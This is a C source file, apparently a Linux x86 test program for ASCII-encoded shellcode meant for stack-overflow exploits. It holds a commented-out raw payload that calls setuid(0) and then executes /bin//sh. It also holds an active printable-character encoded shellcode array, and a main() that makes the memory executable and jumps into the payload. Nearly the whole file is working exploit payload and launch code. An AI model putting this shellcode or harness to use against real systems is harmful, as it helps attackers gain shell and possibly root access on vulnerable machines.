#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <string.h>
#include <sys/mman.h>



/*
 *
 *  asicc encode shellcode test program
 *
 *   just work for  stack-overflow in jmp-sep mode
 *    
 *
 */

/*
 *
 *  this is linux version
 *
 */


/*
 
 char shellcode[] = \
                    "\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
                    "\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
                    "\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";
*/





//asicc encode shellcode

char shellcode[] = \
                   "\x54\x58\x2d\x5d\x54\x56\x68\x2d\x5b\x50\x54\x42\x2d\x59\x5a\x55"
                   "\x55\x50\x5c\x25\x23\x37\x27\x50\x25\x40\x40\x40\x21\x2d\x53\x66"
                   "\x2a\x25\x2d\x49\x66\x2a\x25\x2d\x59\x66\x2a\x25\x50\x2d\x6e\x33"
                   "\x40\x4c\x2d\x63\x30\x40\x45\x2d\x59\x37\x40\x4e\x50\x2d\x59\x4b"
                   "\x24\x62\x2d\x45\x42\x23\x60\x2d\x60\x51\x25\x65\x50\x2d\x2f\x4d"
                   "\x4f\x5a\x2d\x2b\x49\x49\x45\x2d\x27\x53\x4c\x60\x50\x2d\x5e\x5d"
                   "\x60\x76\x2d\x4f\x47\x56\x72\x2d\x42\x5c\x4f\x71\x50\x2d\x63\x61"
                   "\x71\x5f\x2d\x60\x50\x63\x52\x2d\x5e\x4e\x64\x4e\x50\x2d\x63\x3f"
                   "\x54\x74\x2d\x5a\x33\x4d\x6f\x2d\x64\x35\x5c\x79\x50\x2d\x40\x54"
                   "\x33\x28\x2d\x41\x54\x31\x29\x50\x2d\x42\x2c\x52\x5b\x2d\x3d\x2b"
                   "\x49\x4a\x50\x2d\x5d\x54\x61\x5b\x2d\x55\x49\x4b\x4f\x2d\x4e\x47"
                   "\x53\x67\x50\x2d\x5c\x60\x55\x55\x2d\x4e\x5e\x55\x40\x2d\x56\x5c"
                   "\x55\x61\x50";



int main() {

    int size = strlen(shellcode);
    void (*exploit)(void) = (void(*)(void))shellcode;
     if(-1== mprotect((void*)((unsigned)shellcode&0xfffff000),0x1000,PROT_READ|PROT_WRITE|PROT_EXEC)){    
			perror("mprotect");    printf("shellcode size = %d\n",size);
			exit(-1);    
	 }

	__asm__("lea shellcode,%esp");
	__asm__("jmp shellcode");

    return 0;
}



